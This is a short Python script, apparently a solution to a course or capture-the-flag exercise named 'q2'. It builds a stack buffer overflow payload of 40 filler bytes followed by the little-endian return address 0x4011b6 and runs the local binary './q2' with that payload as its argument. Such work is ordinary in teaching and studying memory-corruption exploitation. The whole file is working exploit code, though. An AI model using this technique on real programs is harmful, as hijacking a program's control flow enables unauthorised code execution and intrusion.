#!/usr/bin/python3
# wrapper
import os
buff=40*(b'x')
addr=bytearray.fromhex("4011b6")
addr.reverse()
buff+=addr
print("exec ./q2 with buff",buff)
os.execv('./q2',['./q2',buff])